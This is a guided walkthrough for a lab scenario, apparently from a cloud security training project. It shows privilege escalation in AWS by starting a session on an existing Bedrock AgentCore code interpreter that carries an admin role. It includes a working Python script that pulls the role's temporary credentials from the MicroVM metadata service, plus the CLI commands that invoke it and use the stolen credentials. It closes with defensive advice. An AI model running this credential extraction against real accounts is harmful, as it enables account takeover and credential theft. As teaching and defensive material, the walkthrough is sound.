# Guided Walkthrough: Privilege Escalation via Bedrock AgentCore — Accessing Existing Code Interpreters

This scenario demonstrates a critical privilege escalation vulnerability discovered by Nigel Sood at Sonrai Security in 2025. Unlike the bedrock-001 attack which requires creating a NEW code interpreter with `iam:PassRole`, this scenario exploits EXISTING code interpreters that already have privileged IAM roles attached. An attacker with only `bedrock-agentcore:StartCodeInterpreterSession` and `bedrock-agentcore:InvokeCodeInterpreter` permissions can access pre-deployed code interpreters, start a session, and extract credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254.

This attack is analogous to `lambda:UpdateFunctionCode` versus `lambda:CreateFunction` — it targets existing resources rather than creating new ones, and therefore does NOT require `iam:PassRole` permission since the role is already attached to the interpreter.

The bedrock-002 attack path represents a fundamentally different escalation vector from bedrock-001. Organizations that carefully restrict `iam:PassRole` are still vulnerable if they grant Start/Invoke permissions on existing privileged interpreters. Teams may view `StartCodeInterpreterSession` and `InvokeCodeInterpreter` as "safe" operational permissions, similar to viewing Lambda logs or invoking functions. The attack exploits legitimate business resources (AI/ML interpreters) rather than requiring attacker-controlled infrastructure.

Bedrock code interpreters run on Firecracker MicroVMs, which expose a metadata service similar to EC2's IMDS at 169.254.169.254. The credential path `/latest/meta-data/iam/security-credentials/execution_role` returns a JSON response containing AccessKeyId, SecretAccessKey, Token, and Expiration. Unlike EC2, the MMDS endpoint can be reached using IMDSv2 token-based authentication from any Python code executed inside the interpreter.

**Compared to bedrock-001 (CREATE + PassRole)**:

| Aspect | bedrock-001 (CREATE) | bedrock-002 (ACCESS) |
|--------|---------------------|---------------------|
| **Primary Permission** | `bedrock-agentcore:CreateCodeInterpreter` | `bedrock-agentcore:StartCodeInterpreterSession` |
| **Requires iam:PassRole** | YES | NO |
| **Target Resource** | Creates new interpreter | Accesses existing interpreter |
| **Analogous To** | `lambda:CreateFunction` + `iam:PassRole` | `lambda:UpdateFunctionCode` or `lambda:InvokeFunction` |
| **Detection Focus** | Monitor Create + PassRole combination | Monitor Start/Invoke on privileged interpreters |
| **Common Scenario** | Developer with Create permissions | Operator with "read-only" access to existing interpreters |

**Notes**: This scenario requires a region where Amazon Bedrock AgentCore is available. Unlike bedrock-001, the code interpreter is deployed during `terraform apply` (not during the attack). The cleanup script terminates sessions but preserves the interpreter and IAM infrastructure.

## The Challenge

You start as `pl-prod-bedrock-002-to-admin-starting-user`, a low-privilege IAM user whose only meaningful permissions are `bedrock-agentcore:StartCodeInterpreterSession` and `bedrock-agentcore:InvokeCodeInterpreter` on a specific pre-deployed code interpreter. There is no `iam:PassRole` permission — the role is already attached to the existing interpreter.

Your target is `pl-prod-bedrock-002-to-admin-target-role`, an IAM role with AdministratorAccess that is pre-attached as the execution role for the `pl-prod-bedrock-002-to-admin-target-interpreter` Bedrock code interpreter. To win, you need to extract temporary credentials for that role.

Retrieve your starting credentials from Terraform:

```bash
cd /path/to/pathfinding-labs
MODULE_OUTPUT=$(terraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_bedrock_002_bedrockagentcore_startsession_invoke.value')
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
unset AWS_SESSION_TOKEN
INTERPRETER_ID=$(echo "$MODULE_OUTPUT" | jq -r '.existing_interpreter_id')
```

Verify who you are:

```bash
aws sts get-caller-identity
# Should return: pl-prod-bedrock-002-to-admin-starting-user
```

## Reconnaissance

First, confirm you lack administrative permissions:

```bash
aws iam list-users --max-items 1
# Expected: AccessDenied
```

If you have the helpful `bedrock-agentcore:ListCodeInterpreters` permission, you can enumerate available interpreters:

```bash
aws bedrock-agentcore list-code-interpreters
```

With `bedrock-agentcore:GetCodeInterpreter` you can check the execution role of a specific interpreter:

```bash
aws bedrock-agentcore get-code-interpreter --interpreter-id pl-prod-bedrock-002-to-admin-target-interpreter
```

The output will show the execution role ARN — `pl-prod-bedrock-002-to-admin-target-role` — confirming it has elevated privileges. In a real engagement you would cross-reference that role ARN against IAM to determine its permissions.

## Exploitation

### Step 1: Start a code interpreter session

Start a session on the existing code interpreter. Because `pl-prod-bedrock-002-to-admin-target-role` is already attached to this interpreter, no `iam:PassRole` permission is needed:

```bash
SESSION_ID=$(aws bedrock-agentcore start-code-interpreter-session \
  --code-interpreter-id "$INTERPRETER_ID" \
  --query 'sessionId' --output text)
echo "Session ID: $SESSION_ID"
```

### Step 2: Write the credential extraction Python script

The interpreter executes Python code inside a Firecracker MicroVM. The MicroVM has a metadata service at 169.254.169.254 that serves the execution role's temporary credentials. Write a script that uses IMDSv2 to fetch them:

```python
import urllib.request
import json

# Obtain the IMDSv2 token
token_request = urllib.request.Request(
    "http://169.254.169.254/latest/api/token",
    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
    method='PUT'
)
with urllib.request.urlopen(token_request) as r:
    token = r.read().decode('utf-8')

# Discover the role name
role_request = urllib.request.Request(
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    headers={"X-aws-ec2-metadata-token": token}
)
with urllib.request.urlopen(role_request) as r:
    role_name = r.read().decode('utf-8').strip()

# Fetch the credentials
creds_request = urllib.request.Request(
    f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}",
    headers={"X-aws-ec2-metadata-token": token}
)
with urllib.request.urlopen(creds_request) as r:
    print(r.read().decode('utf-8'))
```

### Step 3: Invoke the interpreter

Send the extraction code through `invoke-code-interpreter`. The API returns a streaming response; parse stdout for the JSON credentials blob:

```bash
aws bedrock-agentcore invoke-code-interpreter \
  --code-interpreter-id "$INTERPRETER_ID" \
  --session-id "$SESSION_ID" \
  --name executeCode \
  --arguments '{"code": "<paste extraction script>", "language": "python"}'
```

The response stream will contain a `structuredContent.stdout` field with a JSON object like:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2025-..."
}
```

### Step 4: Export the extracted credentials

```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId from above>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey from above>"
export AWS_SESSION_TOKEN="<Token from above>"
```

## Verification

Confirm you are now operating as the target role:

```bash
aws sts get-caller-identity
# Should return: pl-prod-bedrock-002-to-admin-target-role
```

Prove administrator access by listing IAM users — something the starting user could not do:

```bash
aws iam list-users --max-items 3
```

A successful result confirms full administrative access to the account.

## What Happened

You started with a minimal set of permissions — `StartCodeInterpreterSession` and `InvokeCodeInterpreter` — which most organizations would consider low-risk "operational" access to an AI/ML workload. However, because `pl-prod-bedrock-002-to-admin-target-role` (AdministratorAccess) was already attached to the interpreter at deploy time, no `iam:PassRole` was needed. By executing a short Python snippet inside the interpreter's Firecracker MicroVM, you were able to query the MicroVM Metadata Service and retrieve live temporary credentials for the admin role.

This follows the same fundamental pattern as `lambda:UpdateFunctionCode` on a privileged Lambda, `codebuild:StartBuild` on a privileged CodeBuild project, or `apprunner:UpdateService` on a privileged App Runner service: **access an existing resource that already carries elevated permissions, then extract or abuse those permissions from within**. The key defensive insight is that restricting `iam:PassRole` alone is insufficient — you must also audit which principals can *start sessions on* or *invoke* existing resources that carry privileged roles.
